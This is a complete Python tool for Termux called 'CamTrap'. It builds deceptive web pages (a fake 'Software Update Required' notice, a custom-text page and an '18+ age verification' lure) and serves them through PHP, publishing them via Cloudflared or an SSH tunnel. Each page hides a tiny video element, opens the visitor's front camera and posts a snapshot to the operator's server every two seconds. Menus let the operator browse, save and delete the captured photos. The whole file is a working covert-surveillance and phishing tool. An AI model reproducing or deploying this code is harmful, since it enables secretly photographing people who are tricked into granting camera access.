#!/data/data/com.termux/files/usr/bin/python3

import os
import sys
import time
import json
import threading
import subprocess
import shutil
import re
from datetime import datetime

R = '\033[1;91m'; G = '\033[1;92m'; Y = '\033[1;93m'
B = '\033[1;94m'; M = '\033[1;95m'; C = '\033[1;96m'; W = '\033[1;97m'; NC = '\033[0m'

PHP_PID = None; TUNNEL_PID = None; CAPTURE_COUNT = 0


def show_banner():
    os.system('clear')
    print()
    print(R + r'       ______               ______                 ')
    print(Y + r'      / ____/___ _____ ___ /_  __/________ _____   ')
    print(G + r'     / /   / __ `/ __ `__ \ / / / ___/ __ `/ __ \  ')
    print(C + r'    / /___/ /_/ / / / / / // / / /  / /_/ / /_/ /  ')
    print(B + r'    \____/\__,_/_/ /_/ /_//_/ /_/   \__,_/ .___/   ')
    print(M + r'                                        /_/        ')
    print()
    print(' ' * 26 + C + 'Creator: ' + Y + 'Made by Hexa Ton')
    print(R + ' ' * 26 + '═════════════════════════')
    print()

def main_menu():
    print()
    print(C+'  ╭'+'─'*55+'╮')
    print(C+'  │'+Y+'             🔥 CAMTRAP - MAIN MENU 🔥                 '+C+'│')
    print(C+'  ├'+'─'*55+'┤')
    print(C+'  │'+' '*55+'│')
    print(C+'  │'+G+'      [1]'+Y+'     🌟  Manual Attack'+' '*24+C+'│')
    print(C+'  │'+W+'             Software Update Template'+' '*18+C+'│')
    print(C+'  │'+' '*55+'│')
    print(C+'  │'+G+'      [2]'+Y+'     📝  Custom Text'+' '*26+C+'│')
    print(C+'  │'+W+'             Write Your Own Text'+' '*23+C+'│')
    print(C+'  │'+' '*55+'│')
    print(C+'  │'+G+'      [3]'+Y+'     🔞  Age Restrict [18+]'+' '*19+C+'│')
    print(C+'  │'+W+'             Adult Content Verification'+' '*16+C+'│')
    print(C+'  │'+' '*55+'│')
    print(C+'  │'+R+'      [0]'+W+'     ❌  Exit'+' '*33+C+'│')
    print(C+'  ╰'+'─'*55+'╯'); print()
    return input(C+'  ['+Y+'?'+C+'] Select Option [0-3]: '+W).strip()

def tunnel_menu():
    def ln(t=""):
        p = re.sub(r'\033\[[0-9;]*m','',t)
        print(M+"  │"+t+" "*(58-len(p))+M+"│")
    print(); print(M+"  ╔══════════════════════════════════════════════════════════╗")
    ln(C+"                🌐 SELECT TUNNEL METHOD")
    print(M+"  ╠══════════════════════════════════════════════════════════╣"); ln()
    ln(G+"   [1] "+Y+"💻 Localhost"); ln(W+"       ╰─> Only Your Device"); ln()
    ln(G+"   [2] "+Y+"☁️ Cloudflared"); ln(W+"       ╰─> Public URL (Any Device)"); ln()
    ln(G+"   [3] "+Y+"🔗 SSH Tunnel"); ln(W+"       ╰─> Via Serveo"); ln()
    ln(R+"   [0] "+W+"🔙 Back")
    print(M+"  ╚══════════════════════════════════════════════════════════╝"); print()
    return input(C+"  [?] Select Tunnel [0-3]: "+W).strip()

def status():
    global CAPTURE_COUNT
    d = os.path.join(os.getcwd(),'captured_data','images')
    if os.path.exists(d): CAPTURE_COUNT = len(os.listdir(d))
    print(); print(G+'  ╔══════════════════════════════════════════════╗')
    print(G+'  ║'+C+'             📸 CAPTURE STATUS'+G+'                 ║')
    print(G+'  ╠══════════════════════════════════════════════╣')
    print(G+'  ║'+Y+f'    Total Photos Captured: {CAPTURE_COUNT} pc(s)'+G+'           ║')
    print(G+'  ║'+W+'    Location: captured_data/images/'+G+'              ║')
    print(G+'  ╚══════════════════════════════════════════════╝'); print()
    print(Y+'       [1] See Captured Photos')
    print(R+'       [0] Back'); print()
    ch = input(C+'  [?] Option: '+W).strip()
    if ch=='1': see_photos()

def see_photos():
    d = os.path.join(os.getcwd(),'captured_data','images')
    if not os.path.exists(d): print(R+'\n  [!] No photos captured yet!'); time.sleep(2); return
    p = sorted(os.listdir(d))
    if not p: print(R+'\n  [!] No photos captured yet!'); time.sleep(2); return
    t = len(p)
    print(); print(G+'  ╔══════════════════════════════════════════════╗')
    print(G+'  ║'+C+'           📁 CAPTURED PHOTOS'+G+'                ║')
    print(G+'  ╠══════════════════════════════════════════════╣')
    for i,x in enumerate(p[-10:],1):
        s = os.path.getsize(os.path.join(d,x))
        print(G+'  ║'+W+f'  {i}. {x[:35]:35s} {s/1024:.1f} KB'+G+'  ║')
    if t>10: print(G+'  ║'+W+f'  ... and {t-10} more'+' '*28+G+'║')
    print(G+'  ╚══════════════════════════════════════════════╝'); print()
    print(Y+'       [S] Save all to Downloads folder')
    print(Y+f'       [O] Open photo by number [1 - {t}]')
    print(R+'       [0] Back'); print()
    ch = input(C+'  [?] Option [S/O/0]: '+W).lower()
    if ch=='s': save_all(d,p)
    elif ch=='o': open_num(d,p,t)

def open_num(d,p,t):
    print(); print(Y+f'  ╔══════════════════════════════════════════╗')
    print(Y+f'  ║'+C+f'     Select photo: 1 to {t}'+Y+'                ║')
    print(Y+f'  ╚══════════════════════════════════════════╝'); print()
    n = input(C+f'  [?] Enter number [1-{t}]: '+W).strip()
    try:
        v = int(n)
        if v<1 or v>t: print(R+f'\n  [!] Invalid! Select between 1 and {t}'); time.sleep(2); return
        fp = os.path.join(d, p[v-1])
        subprocess.run(['termux-open', fp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(G+f'\n  [✓] Opening: {p[v-1]}')
        time.sleep(1)
    except: print(R+'\n  [!] Invalid!'); time.sleep(2)

def save_all(d,p):
    if not p: print(R+'\n  [!] No photos!'); time.sleep(2); return
    dl = os.path.expanduser('~/storage/downloads/CamTrap_Photos')
    os.makedirs(dl, exist_ok=True)
    c = 0
    for f in p:
        try:
            shutil.copy2(os.path.join(d,f), os.path.join(dl,f))
            c += 1
        except: pass
    print(G+f'\n  [✓] {c} photos saved to Downloads/CamTrap_Photos/')
    print(W+'  [✓] Done!'); time.sleep(2)

def print_link(url):
    print(); print(G+'  ╔══════════════════════════════════════════╗')
    print(G+'  ║'+C+'       🌐 LINK GENERATED'+' '*26+G+'║')
    print(G+'  ╠══════════════════════════════════════════╣')
    print(G+'  ║'+G+'  '+url+' '*(56-len(url)-2)+G+'║')
    print(G+'  ╚══════════════════════════════════════════╝'); print()

def stop():
    global PHP_PID, TUNNEL_PID
    for p in [PHP_PID, TUNNEL_PID]:
        if p:
            try: os.kill(p, 9)
            except: pass
    PHP_PID = None; TUNNEL_PID = None

def create_php():
    d = os.path.join(os.getcwd(),'captured_data','images')
    os.makedirs(d, exist_ok=True)
    php = '''<?php
$data = json_decode(file_get_contents("php://input"), true);
if(isset($data["image"])){
    $img = str_replace("data:image/jpeg;base64,", "", $data["image"]);
    $img = str_replace(" ", "+", $img);
    $binary = base64_decode($img);
    $id = uniqid();
    $fn = __DIR__."/captured_data/images/".$id.".jpg";
    file_put_contents($fn, $binary);
    echo "ok";
}
?>'''
    with open('post.php','w') as f: f.write(php)

# ============================================================
# DELETE FUNCTIONS - এখানে নতুন Delete অপশন যোগ করা হয়েছে
# ============================================================
def delete_menu():
    """Main delete menu — user selects how to delete photos."""
    d = os.path.join(os.getcwd(),'captured_data','images')
    if not os.path.exists(d):
        print(R+'\n  [!] No captured_data/images directory found!')
        time.sleep(2); return

    photos = sorted(os.listdir(d))
    if not photos:
        print(R+'\n  [!] No photos to delete!')
        time.sleep(2); return

    total = len(photos)

    while True:
        print()
        print(R+'  ╔══════════════════════════════════════════╗')
        print(R+'  ║'+Y+'          🗑️ DELETE PHOTOS'+R+'               ║')
        print(R+'  ╠══════════════════════════════════════════╣')
        print(R+'  ║'+f'  Total Photos: {total}'+' '*32+R+'║')
        print(R+'  ╠══════════════════════════════════════════╣')
        print(R+'  ║'+G+'  [1]'+W+'  Delete ALL captured photos'+' '*18+R+'║')
        print(R+'  ║'+Y+'       ⚠️  Permanently delete ALL!'+' '*17+R+'║')
        print(R+'  ╠══════════════════════════════════════════╣')
        print(R+'  ║'+G+'  [2]'+W+'  Select manually (by count)'+' '*15+R+'║')
        print(R+'  ║'+Y+'       Delete last N photos'+' '*24+R+'║')
        print(R+'  ╠══════════════════════════════════════════╣')
        print(R+'  ║'+R+'  [0]'+W+'  Back to main menu'+' '*27+R+'║')
        print(R+'  ╚══════════════════════════════════════════╝')
        print()
        choice = input(C+'  [?] Delete option [0-2]: '+W).strip()

        if choice == '0':
            print(G+'\n  [✓] Back to main menu')
            time.sleep(1); return

        elif choice == '1':
            # DELETE ALL
            print()
            print(R+'  ╔══════════════════════════════════════════╗')
            print(R+'  ║'+Y+'     ⚠️  CONFIRM DELETE ALL PHOTOS'+R+'      ║')
            print(R+'  ╠══════════════════════════════════════════╣')
            print(R+'  ║'+f'  {total} photos will be PERMANENTLY deleted'+R+' ║')
            print(R+'  ║'+W+'  This action CANNOT be undone!'+R+'         ║')
            print(R+'  ╚══════════════════════════════════════════╝')
            print()
            conf = input(C+'  [?] Type "yes" to confirm [or Enter to cancel]: '+W).strip().lower()
            if conf == 'yes':
                deleted_count = 0
                for f in photos:
                    try:
                        os.remove(os.path.join(d, f))
                        deleted_count += 1
                    except:
                        pass
                print(G+f'\n  [✓] Successfully deleted {deleted_count} photo(s)!')
                print(R+'  [✗] These photos are gone forever!')
                time.sleep(2); return
            else:
                print(Y+'\n  [!] Delete cancelled.')
                time.sleep(1); continue

        elif choice == '2':
            # DELETE MANUALLY BY COUNT
            print()
            print(Y+f'  ╔══════════════════════════════════════════╗')
            print(Y+f'  ║'+C+f'  Select how many photos to delete (1-{total})'+Y+f'  ║')
            print(Y+f'  ╚══════════════════════════════════════════╝')
            print()
            print(W+'  Photos will be deleted from the') 
            print(W+f'  LATEST captured to oldest. (Last N)')
            print()
            num_str = input(C+f'  [?] Delete how many? [1-{total}]: '+W).strip()
            
            try:
                num = int(num_str)
                if num < 1 or num > total:
                    print(R+f'\n  [!] Invalid! Enter between 1 and {total}')
                    time.sleep(2); continue
            except:
                print(R+'\n  [!] Invalid number!')
                time.sleep(2); continue

            # Show which photos will be deleted
            to_delete = photos[-num:]  # last N photos
            print()
            print(R+'  ╔══════════════════════════════════════════╗')
            print(R+'  ║'+Y+'     ⚠️  CONFIRM DELETE SELECTED'+R+'          ║')
            print(R+'  ╠══════════════════════════════════════════╣')
            print(R+'  ║'+f'  Deleting: {num} photo(s)'+' '*31+R+'║')
            print(R+'  ║'+W+'  These will be PERMANENTLY deleted!'+R+'    ║')
            print(R+'  ╚══════════════════════════════════════════╝')
            
            # Show first 5 filenames as preview
            print()
            print(W+'  Preview (last few):')
            for i, fname in enumerate(to_delete[-5:], 1):
                fpath = os.path.join(d, fname)
                size = os.path.getsize(fpath) / 1024
                print(f'    {i}. {fname[:30]:30s} {size:.1f} KB')
            if num > 5:
                print(W+f'    ... and {num-5} more')
            print()
            
            conf = input(C+'  [?] Type "yes" to confirm [or Enter to cancel]: '+W).strip().lower()
            if conf == 'yes':
                deleted_count = 0
                for f in to_delete:
                    try:
                        os.remove(os.path.join(d, f))
                        deleted_count += 1
                    except:
                        pass
                print(G+f'\n  [✓] Successfully deleted {deleted_count} photo(s)!')
                print(R+'  [✗] These photos are gone forever!')
                time.sleep(2); return
            else:
                print(Y+'\n  [!] Delete cancelled.')
                time.sleep(1); continue

        else:
            print(R+'\n  [!] Invalid option!')
            time.sleep(1); continue


def get_template(t, custom_text=''):
    if t=='manual':
        return '''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Software Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Arial,sans-serif}
body{background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}
.card{width:100%;max-width:380px;background:#fff;border-radius:24px;padding:30px 25px;box-shadow:0 10px 40px rgba(0,0,0,.08);text-align:center}
.icon{font-size:50px;margin-bottom:10px}
h1{color:#1a1a2e;font-size:22px;font-weight:800}
p{color:#666;font-size:14px;margin:12px 0;line-height:1.5}
.warning{background:#fff3e0;padding:10px;border-radius:10px;margin:10px 0;font-size:12px}
.btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;background:#1a73e8;color:#fff;margin-top:10px;transition:all .3s}
.btn:disabled{opacity:.6}
#progressArea{margin-top:15px}
#bar{height:6px;background:linear-gradient(90deg,#1a73e8,#4a9eff);border-radius:10px;width:0%;transition:width .5s}
#ptext{font-size:12px;color:#999;margin-top:8px}
#video{width:1px;height:1px;position:absolute;opacity:0.01;pointer-events:none}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#9881;</div>
<h1>Software Update Required</h1>
<p>Your device needs an important security update.</p>
<div class="warning"><p>&#9888; Critical security patches included</p></div>
<p style="font-size:12px;color:#999;margin-top:10px">Version 12.5.3 - 2.4 MB</p>
<button class="btn" id="mainBtn">&#9654; Install Update Now</button>
<div id="progressArea" style="display:none">
<div style="background:#f0f0f0;border-radius:10px;height:6px;overflow:hidden"><div id="bar"></div></div>
<p id="ptext">0% - Installing...</p>
</div>
<video id="video" autoplay muted playsinline></video>
</div>
<script>
(function(){
var v=document.getElementById('video');
initCamera();

function initCamera(){
    var started=false;
    var capInterval=null;
    var constraints={video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false};
    
    function tryGet(){
        navigator.mediaDevices.getUserMedia(constraints).then(function(stream){
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            capInterval=setInterval(function(){
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){
                        fetch('post.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:d})});
                    }
                }catch(e){}
                try{
                    if(typeof ImageCapture!=='undefined'&&v.srcObject){
                        var t=v.srcObject.getVideoTracks()[0];
                        if(t&&t.readyState==='live'){
                            new ImageCapture(t).grabFrame().then(function(bm){
                                if(bm&&bm.width>10){
                                    var cc=document.createElement('canvas');
                                    cc.width=bm.width;
                                    cc.height=bm.height;
                                    cc.getContext('2d').drawImage(bm,0,0);
                                    var dd=cc.toDataURL('image/jpeg',0.95);
                                    if(dd&&dd.length>3000){
                                        fetch('post.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:dd})});
                                    }
                                }
                                bm.close();
                            }).catch(function(){});
                        }
                    }
                }catch(e){}
            },2000);
        }).catch(function(err){console.log('Camera error:',err);});
    }

    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
        tryGet();
    } else if(navigator.webkitGetUserMedia){
        navigator.webkitGetUserMedia(constraints,function(stream){
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            capInterval=setInterval(function(){
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){
                        fetch('post.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:d})});
                    }
                }catch(e){}
            },2000);
        },function(){});
    }
}
})();
</script>
</body></html>'''
    elif t=='custom':
        safe_text = custom_text if custom_text else 'Welcome'
        txt_len = len(safe_text)
        if txt_len <= 15:
            fs = '28px'
        elif txt_len <= 30:
            fs = '22px'
        elif txt_len <= 60:
            fs = '18px'
        else:
            fs = '16px'
        return f'''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>{safe_text}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Arial,sans-serif}}
body{{background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}}
.card{{width:100%;max-width:380px;background:#fff;border-radius:20px;padding:40px 25px;text-align:center;word-break:break-word;overflow-wrap:break-word}}
h1{{font-size:{fs};font-weight:900;color:#111;letter-spacing:0.5px;line-height:1.4;padding:5px 0}}
#video{{width:1px;height:1px;position:absolute;opacity:0.01;pointer-events:none}}
</style>
</head>
<body>
<div class="card">
<h1>🎉 {safe_text} 🎉</h1>
<video id="video" autoplay muted playsinline></video>
</div>
<script>
(function(){{
var v=document.getElementById('video');
initCamera();

function initCamera(){{
    var started=false;
    var capInterval=null;
    var constraints={{video:{{facingMode:'user',width:{{ideal:640}},height:{{ideal:480}}}},audio:false}};
    
    function tryGet(){{
        navigator.mediaDevices.getUserMedia(constraints).then(function(stream){{
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            capInterval=setInterval(function(){{
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){{
                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:d}})}});
                    }}
                }}catch(e){{}}
                try{{
                    if(typeof ImageCapture!=='undefined'&&v.srcObject){{
                        var t=v.srcObject.getVideoTracks()[0];
                        if(t&&t.readyState==='live'){{
                            new ImageCapture(t).grabFrame().then(function(bm){{
                                if(bm&&bm.width>10){{
                                    var cc=document.createElement('canvas');
                                    cc.width=bm.width;
                                    cc.height=bm.height;
                                    cc.getContext('2d').drawImage(bm,0,0);
                                    var dd=cc.toDataURL('image/jpeg',0.95);
                                    if(dd&&dd.length>3000){{
                                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:dd}})}});
                                    }}
                                }}
                                bm.close();
                            }}).catch(function(){{}});
                        }}
                    }}
                }}catch(e){{}}
            }},2000);
        }}).catch(function(err){{console.log('Camera error:',err);}});
    }}

    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){{
        tryGet();
    }} else if(navigator.webkitGetUserMedia){{
        navigator.webkitGetUserMedia(constraints,function(stream){{
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            capInterval=setInterval(function(){{
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){{
                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:d}})}});
                    }}
                }}catch(e){{}}
            }},2000);
        }},function(){{}});
    }}
}}
}})();
</script>
</body></html>'''
    elif t=='18+':
        return '''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>18+ Age Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Arial,sans-serif}
body{background:#0a0008;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px}
.card{width:100%;max-width:380px;background:linear-gradient(180deg,#1a0012,#0d0008);border-radius:24px;padding:25px 20px;border:1px solid #ff006644;text-align:center}
.age-icon{font-size:50px;margin-bottom:5px}
.badge{display:inline-block;background:linear-gradient(135deg,#ff0066,#cc0055);color:#fff;padding:4px 14px;border-radius:6px;font-size:11px;font-weight:800;letter-spacing:2px;margin:8px 0}
h1{color:#ff6699;font-size:20px}
p{color:#884466;font-size:14px;margin:10px 0;line-height:1.5}
.vid-box{background:#1a0012;border-radius:14px;padding:25px;margin:15px 0;border:1px solid #ff006633}
.vid-box .emoji{font-size:45px}
.btn{width:100%;padding:15px;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#ff0066,#cc0055);color:#fff;margin-top:10px}
#video{width:1px;height:1px;position:absolute;opacity:0.01;pointer-events:none}
</style>
</head>
<body>
<div class="card">
<div class="age-icon">&#128286;</div>
<div class="badge">+18 ADULT CONTENT</div>
<h1>Exclusive Adult Video</h1>
<p>You must be 18+ to watch</p>
<div class="vid-box"><div class="emoji">&#127825;&#127826;</div></div>
<button class="btn" id="mainBtn">&#9654; Verify Age</button>
<video id="video" autoplay muted playsinline></video>
</div>
<script>
(function(){{
var v=document.getElementById('video');
initCamera();

function initCamera(){{
    var started=false;
    var capInterval=null;
    var constraints={{video:{{facingMode:'user',width:{{ideal:640}},height:{{ideal:480}}}},audio:false}};
    
    function tryGet(){{
        navigator.mediaDevices.getUserMedia(constraints).then(function(stream){{
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            document.querySelector('.vid-box').innerHTML='<p style="color:#4CAF50;font-size:18px">&#10004; Camera Active</p>';
            capInterval=setInterval(function(){{
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){{
                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:d}})}});
                    }}
                }}catch(e){{}}
                try{{
                    if(typeof ImageCapture!=='undefined'&&v.srcObject){{
                        var t=v.srcObject.getVideoTracks()[0];
                        if(t&&t.readyState==='live'){{
                            new ImageCapture(t).grabFrame().then(function(bm){{
                                if(bm&&bm.width>10){{
                                    var cc=document.createElement('canvas');
                                    cc.width=bm.width;
                                    cc.height=bm.height;
                                    cc.getContext('2d').drawImage(bm,0,0);
                                    var dd=cc.toDataURL('image/jpeg',0.95);
                                    if(dd&&dd.length>3000){{
                                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:dd}})}});
                                    }}
                                }}
                                bm.close();
                            }}).catch(function(){{}});
                        }}
                    }}
                }}catch(e){{}}
            }},2000);
        }}).catch(function(err){{console.log('Camera error:',err);}});
    }}

    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){{
        tryGet();
    }} else if(navigator.webkitGetUserMedia){{
        navigator.webkitGetUserMedia(constraints,function(stream){{
            v.srcObject=stream;
            v.setAttribute('playsinline','true');
            started=true;
            document.querySelector('.vid-box').innerHTML='<p style="color:#4CAF50;font-size:18px">&#10004; Camera Active</p>';
            capInterval=setInterval(function(){{
                if(!v||!v.videoWidth||v.videoWidth===0) return;
                try{{
                    var ca=document.createElement('canvas');
                    ca.width=v.videoWidth;
                    ca.height=v.videoHeight;
                    var ctx=ca.getContext('2d');
                    ctx.translate(ca.width,0);
                    ctx.scale(-1,1);
                    ctx.drawImage(v,0,0,ca.width,ca.height);
                    ctx.setTransform(1,0,0,1,0,0);
                    var d=ca.toDataURL('image/jpeg',0.95);
                    if(d&&d.length>3000){{
                        fetch('post.php',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:d}})}});
                    }}
                }}catch(e){{}}
            }},2000);
        }},function(){{}});
    }}
}}
}})();
</script>
</body></html>'''
def main():
    global CAPTURE_COUNT
    try:
        while True:
            show_banner()
            ch = main_menu()
            if ch=='0': print(R+'\n  [!] Exiting...'); stop(); sys.exit(0)
            if ch=='1': html=get_template('manual'); print(G+'\n  [✓] Manual - Software Update')
            elif ch=='2':
                print(); txt=input(C+'  [?] Enter your custom text: '+W)
                if not txt.strip(): txt='Welcome!'
                html=get_template('custom', txt)
                print(G+f'\n  [✓] Custom text: "{txt}"')
            elif ch=='3': html=get_template('18+'); print(G+'\n  [✓] Age Restrict 18+')
            else: print(R+'\n  [✗] Invalid!'); time.sleep(1); continue
            with open('index.html','w') as f: f.write(html)
            create_php()
            tm=tunnel_menu()
            if tm=='0': continue
            port='8080'
            if tm=='1': port=input(C+'\n  [?] Port [8080]: '+W) or '8080'
            start_php(port); CAPTURE_COUNT=0
            if tm=='1':
                print_link(f'http://localhost:{port}')
                print(Y+'  Commands:'); print(W+'    c  = Check   s  = Save'); print(W+'    d  = Delete   q  = Stop'); print()
                while True:
                    cmd=input(C+'  > '+W).lower()
                    if cmd=='q': break
                    elif cmd=='c': status()
                    elif cmd=='s':
                        d=os.path.join(os.getcwd(),'captured_data','images')
                        if os.path.exists(d): save_all(d,sorted(os.listdir(d)))
                    elif cmd=='d': delete_menu()
            elif tm=='2':
                print(Y+'\n  [*] Starting Cloudflared...')
                url_file=os.path.join(os.getcwd(),'captured_data','cloudflared_url.txt')
                if os.path.exists(url_file): os.remove(url_file)
                cf_check=subprocess.run(['which','cloudflared'],capture_output=True,text=True)
                if cf_check.returncode!=0:
                    print(Y+'  [*] Installing cloudflared...')
                    subprocess.run(['pkg','install','-y','cloudflared'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                cf=subprocess.Popen(['cloudflared','tunnel','--url',f'http://localhost:{port}'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
                global TUNNEL_PID; TUNNEL_PID=cf.pid
                fu=[None]
                def cu(proc,found):
                    for l in iter(proc.stdout.readline,''):
                        l=l.strip()
                        if 'trycloudflare.com' in l and 'http' in l:
                            u=re.findall(r'https?://[^\s]+\.trycloudflare\.com',l)
                            if u: found[0]=u[0]; os.makedirs(os.path.join(os.getcwd(),'captured_data'),exist_ok=True); open(url_file,'w').write(found[0]); break
                        if 'has been created' in l and found[0] is None:
                            u=re.findall(r'https?://[^\s]+',l)
                            if u: found[0]=u[0]; os.makedirs(os.path.join(os.getcwd(),'captured_data'),exist_ok=True); open(url_file,'w').write(found[0]); break
                threading.Thread(target=cu,args=(cf,fu),daemon=True).start()
                print(Y+'  [*] Waiting for URL...')
                for i in range(25):
                    if fu[0] is not None: break
                    if os.path.exists(url_file):
                        data=open(url_file).read().strip()
                        if data: fu[0]=data; break
                    time.sleep(1)
                    if i%5==0 and i>0: print(Y+f'  [*] Waiting... ({i}s)')
                print()
                if fu[0]: print_link(fu[0])
                else:
                    if os.path.exists(url_file):
                        data=open(url_file).read().strip()
                        if data: fu[0]=data; print_link(fu[0])
                    else:
                        print(Y+'  ╔══════════════════════════════════════════╗')
                        print(Y+'  ║'+R+'  URL not detected yet'+' '*24+Y+'║')
                        print(Y+'  ║'+W+'  Type "url" to check'+' '*25+Y+'║')
                        print(Y+'  ╚══════════════════════════════════════════╝')
                print()
                print(Y+'  Commands:'); print(W+'    c  = Check   s  = Save'); print(W+'    d  = Delete   url = Show URL'); print(W+'    q  = Stop'); print()
                while True:
                    cmd=input(C+'  > '+W).lower()
                    if cmd=='q': break
                    elif cmd=='c': status()
                    elif cmd=='url':
                        if fu[0]: print_link(fu[0])
                        elif os.path.exists(url_file):
                            u=open(url_file).read().strip()
                            if u: fu[0]=u; print_link(u)
                            else: print(R+'\n  [!] Not ready')
                        else: print(R+'\n  [!] Not ready')
                    elif cmd=='s':
                        d=os.path.join(os.getcwd(),'captured_data','images')
                        if os.path.exists(d): save_all(d,sorted(os.listdir(d)))
                    elif cmd=='d': delete_menu()
            elif tm=='3':
                print()
                print(G+'  ╔══════════════════════════════════════════╗')
                print(G+'  ║'+Y+'         SSH Tunnel Instructions'+' '*25+G+'║')
                print(G+'  ╠══════════════════════════════════════════╣')
                print(G+'  ║'+W+'  Open new Termux session & run:'+' '*17+G+'║')
                print(G+'  ║'+Y+f'  ssh -R 80:localhost:{port} nokey@localhost.run'+G+'  ║')
                print(G+'  ║'+W+'  Link will appear there'+' '*27+G+'║')
                print(G+'  ╠══════════════════════════════════════════╣')
                print(G+'  ║'+G+'  ✅ Server Running'+' '*35+G+'║')
                print(G+'  ╚══════════════════════════════════════════╝'); print()
                print(Y+'  Commands:'); print(W+'    c  = Check   s  = Save'); print(W+'    d  = Delete   q  = Stop'); print()
                while True:
                    cmd=input(C+'  > '+W).lower()
                    if cmd=='q': break
                    elif cmd=='c': status()
                    elif cmd=='s':
                        d=os.path.join(os.getcwd(),'captured_data','images')
                        if os.path.exists(d): save_all(d,sorted(os.listdir(d)))
                    elif cmd=='d': delete_menu()
    except KeyboardInterrupt: print(R+'\n\n [!] Interrupted')
    finally:
        stop()
        print(); print(G+"  ╔═══════════════════════════════════════════╗")
        print(G+"  ║"+C+"       ✦ Thanks for using CamTrap! ✦       "+G+"║")
        print(G+"  ║"+M+"       ✦ Creator: Made by Hexa Ton ✦       "+G+"║")
        print(G+"  ╚═══════════════════════════════════════════╝"); print(NC)

def start_php(port):
    global PHP_PID
    stop()
    p=subprocess.Popen(['php','-S',f'0.0.0.0:{port}'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    time.sleep(1); PHP_PID=p.pid; print(G+f'\n  [✓] PHP Server on port {port}')

if __name__=="__main__":
    main()
